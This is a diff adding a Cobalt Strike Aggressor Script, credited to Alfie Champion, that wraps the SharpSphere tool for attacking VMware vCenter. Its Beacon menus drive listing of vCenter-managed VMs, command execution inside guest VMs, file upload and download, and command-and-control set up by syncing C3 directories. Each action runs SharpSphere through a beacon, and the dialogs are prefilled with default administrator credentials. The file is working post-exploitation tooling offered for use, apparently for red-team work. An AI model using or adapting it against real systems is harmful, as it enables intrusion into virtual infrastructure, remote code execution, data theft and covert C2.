@@ -1,0 +1,552 @@
+# 
+# Aggressor Script for James Coote's (@jkcoote) SharpSphere
+#
+# See https://jamescoote.co.uk/introducing-sharpsphere/ for feature walkthrough
+# 
+# Includes menu with options for:
+#	 - Listing VMs
+#	 - Executing Commands 
+#	 - Uploading Files to Guest VMs
+#	 - Downloading Files From Guest VMs
+#	 - Establishing C2 via Syncing C3 Directories
+#
+# Aggressor Script created by Alfie Champion (@ajpc500) 
+#
+
+popup beacon_top {
+	menu vSphere{
+		item "List VMs"{
+			local('$bid');
+			foreach $bid ($1){
+				vSphereDialogs::ListVms($bid);
+			}
+		}
+		item "Execute Command"{
+			local('$bid');
+			foreach $bid ($1){
+				vSphereDialogs::Execute($bid);
+			}
+		}
+		item "Upload File"{
+			local('$bid');
+			foreach $bid ($1){
+				vSphereDialogs::Upload($bid);
+			}
+		}
+		item "Download File"{
+			local('$bid');
+			foreach $bid ($1){
+				vSphereDialogs::Download($bid);
+			}
+		}
+		item "C2 via C3"{
+			local('$bid');
+			foreach $bid ($1){
+				vSphereDialogs::c2($bid);
+			}
+		}
+	}
+}
+
+#Modify this to the location of the SharpSphere assembly
+$sharpsphere = "SharpSphere.exe";
+
+sub vSphereDialogs::ListVms{
+	local('$dialog $url $username $password $sharpspherearg')
+	$bid = $1;
+	
+	$dialog = dialog("SharpSphere - List VMs", %(url => "https://127.0.0.1/sdk", username => "administrator@vsphere.local", password => "Password1!"), lambda({
+		$url = $3['url'];
+		$username = $3['username'];
+		$password = $3['password'];
+		
+		$sharpspherearg = "list ";
+
+		if($3['url'] eq ""){
+			berror($bid, "\c4Error: \c4URL Required. vCenter SDK URL, i.e. https://127.0.0.1/sdk");
+			break;
+		}
+
+		if($3['username'] eq ""){
+			berror($bid, "\c4Error: \cUsername Required. vCenter username, i.e. administrator@vsphere.local");
+			break;
+		}
+
+		if($3['password'] eq ""){
+			berror($bid, "\c4Error: \cPassword Required. vCenter password");
+			break;
+		}
+
+		$sharpspherearg .= '--url ';
+		$sharpspherearg .= $url;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--username ';
+		$sharpspherearg .= $username;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--password ';
+		$sharpspherearg .= $password;
+
+		binput($bid, "sharpsphere  $+ $sharpspherearg");
+		btask($bid, 'Executing SharpSphere');
+		btask($bid, 'Listing virtual machines managed by vCenter');
+	
+		bexecute_assembly!($bid, script_resource($sharpsphere), $sharpspherearg);
+	}));
+
+	dialog_description($dialog, "Interact with vCenter Server via SharpSphere to list Virtual Machines.");
+	drow_text($dialog, 'url', 'vCenter SDK URL');
+	drow_text($dialog, 'username', 'Username');
+	drow_text($dialog, 'password', 'Password');
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub vSphereDialogs::Execute{
+	local('$dialog $url $username $password $ip $guestusername $guestpassword $command $printoutput $sharpspherearg')
+	$bid = $1;
+	
+	$dialog = dialog("SharpSphere - Execute Command", %(url => "https://127.0.0.1/sdk", username => "administrator@vsphere.local", password => "Password1!", ip => "", guestusername => "", guestpassword => "", command => "", printoutput => ""), lambda({
+		$url = $3['url'];
+		$username = $3['username'];
+		$password = $3['password'];
+		$ip = $3['ip'];
+		$guestusername = $3['guestusername'];
+		$guestpassword = $3['guestpassword'];
+		$command = $3['command'];
+		$printoutput = $3['printoutput'];
+
+		$sharpspherearg = "execute ";
+
+		if($3['url'] eq ""){
+			berror($bid, "\c4Error: \c4URL Required. vCenter SDK URL, i.e. https://127.0.0.1/sdk");
+			break;
+		}
+
+		if($3['username'] eq ""){
+			berror($bid, "\c4Error: \cUsername Required. vCenter username, i.e. administrator@vsphere.local");
+			break;
+		}
+
+		if($3['password'] eq ""){
+			berror($bid, "\c4Error: \cPassword Required. vCenter password");
+			break;
+		}
+
+		if($3['ip'] eq ""){
+			berror($bid, "\c4Error: \cIP Required. Target VM IP address");
+			break;
+		}
+
+		if($3['guestusername'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Username Required. Can be a domain user e.g. UK\test.user");
+			break;
+		}
+
+		if($3['guestpassword'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Password Required.");
+			break;
+		}
+
+		if($3['command'] eq ""){
+			berror($bid, "\c4Error: \cCommand Required. e.g. whoami");
+			break;
+		}
+		
+		$sharpspherearg .= '--url ';
+		$sharpspherearg .= $url;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--username ';
+		$sharpspherearg .= $username;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--password ';
+		$sharpspherearg .= $password;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--ip ';
+		$sharpspherearg .= $ip;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestusername ';
+		$sharpspherearg .= $guestusername;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestpassword ';
+		$sharpspherearg .= $guestpassword;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--command ';
+		$sharpspherearg .= $command;
+		$sharpspherearg .= ' ';
+
+		if($3['printoutput'] eq 'true'){
+			$sharpspherearg .= '--output';
+		}
+
+		binput($bid, "sharpsphere  $+ $sharpspherearg");
+		btask($bid, 'Executing SharpSphere');
+		btask($bid, 'Executing command on guest virtual machine managed by vCenter');
+	
+		bexecute_assembly!($bid, script_resource($sharpsphere), $sharpspherearg);
+	}));
+
+	dialog_description($dialog, "Interact with vCenter Server via SharpSphere to execute command on guest virtual machine.");
+	drow_text($dialog, 'url', 'vCenter SDK URL');
+	drow_text($dialog, 'username', 'Username');
+	drow_text($dialog, 'password', 'Password');
+	drow_text($dialog, 'ip', 'Guest IP');
+	drow_text($dialog, 'guestusername', 'Guest Username');
+	drow_text($dialog, 'guestpassword', 'Guest Password');
+	drow_text($dialog, 'command', 'Command');
+	drow_checkbox($dialog, "printoutput", "Print Output ", "Pipe command output to file, download and delete.");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub vSphereDialogs::Upload{
+	local('$dialog $url $username $password $ip $guestusername $guestpassword $source $destination $sharpspherearg')
+	$bid = $1;
+	
+	$dialog = dialog("SharpSphere - Upload File", %(url => "https://127.0.0.1/sdk", username => "administrator@vsphere.local", password => "Password1!", ip => "", guestusername => "", guestpassword => "", source => "", destination => ""), lambda({
+		$url = $3['url'];
+		$username = $3['username'];
+		$password = $3['password'];
+		$ip = $3['ip'];
+		$guestusername = $3['guestusername'];
+		$guestpassword = $3['guestpassword'];
+		$source = $3['source'];
+		$destination = $3['destination'];
+
+		$sharpspherearg = "upload ";
+
+		if($3['url'] eq ""){
+			berror($bid, "\c4Error: \c4URL Required. vCenter SDK URL, i.e. https://127.0.0.1/sdk");
+			break;
+		}
+
+		if($3['username'] eq ""){
+			berror($bid, "\c4Error: \cUsername Required. vCenter username, i.e. administrator@vsphere.local");
+			break;
+		}
+
+		if($3['password'] eq ""){
+			berror($bid, "\c4Error: \cPassword Required. vCenter password");
+			break;
+		}
+
+		if($3['ip'] eq ""){
+			berror($bid, "\c4Error: \cIP Required. Target VM IP address");
+			break;
+		}
+
+		if($3['guestusername'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Username Required. Can be a domain user e.g. UK\test.user");
+			break;
+		}
+
+		if($3['guestpassword'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Password Required.");
+			break;
+		}
+
+		if($3['source'] eq ""){
+			berror($bid, "\c4Error: \cUpload Source Location Required.");
+			break;
+		}
+		
+		if($3['destination'] eq ""){
+			berror($bid, "\c4Error: \cUpload Destination Location Required.");
+			break;
+		}
+
+		$sharpspherearg .= '--url ';
+		$sharpspherearg .= $url;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--username ';
+		$sharpspherearg .= $username;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--password ';
+		$sharpspherearg .= $password;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--ip ';
+		$sharpspherearg .= $ip;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestusername ';
+		$sharpspherearg .= $guestusername;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestpassword ';
+		$sharpspherearg .= $guestpassword;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--source ';
+		$sharpspherearg .= $source;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--destination ';
+		$sharpspherearg .= $destination;
+
+		binput($bid, "sharpsphere  $+ $sharpspherearg");
+		btask($bid, 'Executing SharpSphere');
+		btask($bid, 'Uploading file on guest virtual machine managed by vCenter');
+	
+		bexecute_assembly!($bid, script_resource($sharpsphere), $sharpspherearg);
+	}));
+
+	dialog_description($dialog, "Interact with vCenter Server via SharpSphere to upload a file to guest virtual machine.");
+	drow_text($dialog, 'url', 'vCenter SDK URL');
+	drow_text($dialog, 'username', 'Username');
+	drow_text($dialog, 'password', 'Password');
+	drow_text($dialog, 'ip', 'Guest IP');
+	drow_text($dialog, 'guestusername', 'Guest Username');
+	drow_text($dialog, 'guestpassword', 'Guest Password');
+	drow_text($dialog, 'source', 'Source File');
+	drow_text($dialog, 'destination', 'Upload Destination');
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub vSphereDialogs::Download{
+	local('$dialog $url $username $password $ip $guestusername $guestpassword $source $destination $sharpspherearg')
+	$bid = $1;
+	
+	$dialog = dialog("SharpSphere - Download File", %(url => "https://127.0.0.1/sdk", username => "administrator@vsphere.local", password => "Password1!", ip => "", guestusername => "", guestpassword => "", source => "", destination => ""), lambda({
+		$url = $3['url'];
+		$username = $3['username'];
+		$password = $3['password'];
+		$ip = $3['ip'];
+		$guestusername = $3['guestusername'];
+		$guestpassword = $3['guestpassword'];
+		$source = $3['source'];
+		$destination = $3['destination'];
+
+		$sharpspherearg = "download ";
+
+		if($3['url'] eq ""){
+			berror($bid, "\c4Error: \c4URL Required. vCenter SDK URL, i.e. https://127.0.0.1/sdk");
+			break;
+		}
+
+		if($3['username'] eq ""){
+			berror($bid, "\c4Error: \cUsername Required. vCenter username, i.e. administrator@vsphere.local");
+			break;
+		}
+
+		if($3['password'] eq ""){
+			berror($bid, "\c4Error: \cPassword Required. vCenter password");
+			break;
+		}
+
+		if($3['ip'] eq ""){
+			berror($bid, "\c4Error: \cIP Required. Target VM IP address");
+			break;
+		}
+
+		if($3['guestusername'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Username Required. Can be a domain user e.g. UK\test.user");
+			break;
+		}
+
+		if($3['guestpassword'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Password Required.");
+			break;
+		}
+
+		if($3['source'] eq ""){
+			berror($bid, "\c4Error: \cRemote File Location Required.");
+			break;
+		}
+		
+		if($3['destination'] eq ""){
+			berror($bid, "\c4Error: \cLocal Download Destination Required.");
+			break;
+		}
+
+		$sharpspherearg .= '--url ';
+		$sharpspherearg .= $url;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--username ';
+		$sharpspherearg .= $username;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--password ';
+		$sharpspherearg .= $password;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--ip ';
+		$sharpspherearg .= $ip;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestusername ';
+		$sharpspherearg .= $guestusername;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestpassword ';
+		$sharpspherearg .= $guestpassword;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--source ';
+		$sharpspherearg .= $source;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--destination ';
+		$sharpspherearg .= $destination;
+
+		binput($bid, "sharpsphere  $+ $sharpspherearg");
+		btask($bid, 'Executing SharpSphere');
+		btask($bid, 'Downloading file from guest virtual machine managed by vCenter');
+	
+		bexecute_assembly!($bid, script_resource($sharpsphere), $sharpspherearg);
+	}));
+
+	dialog_description($dialog, "Interact with vCenter Server via SharpSphere to download a file from guest virtual machine.");
+	drow_text($dialog, 'url', 'vCenter SDK URL');
+	drow_text($dialog, 'username', 'Username');
+	drow_text($dialog, 'password', 'Password');
+	drow_text($dialog, 'ip', 'Guest IP');
+	drow_text($dialog, 'guestusername', 'Guest Username');
+	drow_text($dialog, 'guestpassword', 'Guest Password');
+	drow_text($dialog, 'source', 'Remote File');
+	drow_text($dialog, 'destination', 'Download Destination');
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+
+sub vSphereDialogs::c2{
+	local('$dialog $url $username $password $ip $guestusername $guestpassword $localdir $guestdir $inputid $outputid $sharpspherearg')
+	$bid = $1;
+	
+	$dialog = dialog("SharpSphere - C2", %(url => "https://127.0.0.1/sdk", username => "administrator@vsphere.local", password => "Password1!", ip => "", guestusername => "", guestpassword => "", $localdir => "", $guestdir => "", $inputid => "", $outputid => ""), lambda({
+		$url = $3['url'];
+		$username = $3['username'];
+		$password = $3['password'];
+		$ip = $3['ip'];
+		$guestusername = $3['guestusername'];
+		$guestpassword = $3['guestpassword'];
+		$localdir = $3['localdir'];
+		$guestdir = $3['guestdir'];
+
+		$inputid = $3['inputid'];
+		$outputid = $3['outputid'];
+
+		$sharpspherearg = "c2 ";
+
+		if($3['url'] eq ""){
+			berror($bid, "\c4Error: \c4URL Required. vCenter SDK URL, i.e. https://127.0.0.1/sdk");
+			break;
+		}
+
+		if($3['username'] eq ""){
+			berror($bid, "\c4Error: \cUsername Required. vCenter username, i.e. administrator@vsphere.local");
+			break;
+		}
+
+		if($3['password'] eq ""){
+			berror($bid, "\c4Error: \cPassword Required. vCenter password");
+			break;
+		}
+
+		if($3['ip'] eq ""){
+			berror($bid, "\c4Error: \cIP Required. Target VM IP address");
+			break;
+		}
+
+		if($3['guestusername'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Username Required. Can be a domain user e.g. UK\test.user");
+			break;
+		}
+
+		if($3['guestpassword'] eq ""){
+			berror($bid, "\c4Error: \cGuest VM Password Required.");
+			break;
+		}
+
+		if($3['localdir'] eq ""){
+			berror($bid, "\c4Error: \c Local C3 Directory Required. Full path to the C3 directory on this machine");
+			break;
+		}
+		
+		if($3['guestdir'] eq ""){
+			berror($bid, "\c4Error: \cGuest C3 Directory Required. Full path to the C3 directory on the guest machine");
+			break;
+		}
+
+		if($3['inputid'] eq ""){
+			berror($bid, "\c4Error: \cInput ID Required. Input ID configured for the C3 relay running on this machine");
+			break;
+		}
+
+		if($3['outputid'] eq ""){
+			berror($bid, "\c4Error: \cOutput ID Required. Output ID configured for the C3 relay running on this machine");
+			break;
+		}
+
+		$sharpspherearg .= '--url ';
+		$sharpspherearg .= $url;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--username ';
+		$sharpspherearg .= $username;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--password ';
+		$sharpspherearg .= $password;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--ip ';
+		$sharpspherearg .= $ip;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestusername ';
+		$sharpspherearg .= $guestusername;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestpassword ';
+		$sharpspherearg .= $guestpassword;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--localdir ';
+		$sharpspherearg .= $localdir;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--guestdir ';
+		$sharpspherearg .= $guestdir;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--inputid ';
+		$sharpspherearg .= $inputid;
+		$sharpspherearg .= ' ';
+
+		$sharpspherearg .= '--outputid ';
+		$sharpspherearg .= $outputid;
+
+		binput($bid, "sharpsphere  $+ $sharpspherearg");
+		btask($bid, 'Executing SharpSphere');
+		btask($bid, 'Establishing C2 communication by syncing C3 files in local and guest virtual machine directories.');
+	
+		bexecute_assembly!($bid, script_resource($sharpsphere), $sharpspherearg);
+	}));
+
+	dialog_description($dialog, "Interact with vCenter Server via SharpSphere to establish C2 on guest virtual machine.");
+	drow_text($dialog, 'url', 'vCenter SDK URL');
+	drow_text($dialog, 'username', 'Username');
+	drow_text($dialog, 'password', 'Password');
+	drow_text($dialog, 'ip', 'Guest IP');
+	drow_text($dialog, 'guestusername', 'Guest Username');
+	drow_text($dialog, 'guestpassword', 'Guest Password');
+	drow_text($dialog, 'localdir', 'Local File Directory');
+	drow_text($dialog, 'guestdir', 'Guest File Directory');
+	drow_text($dialog, 'inputid', 'C3 Input ID');
+	drow_text($dialog, 'outputid', 'C3 Output ID');
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
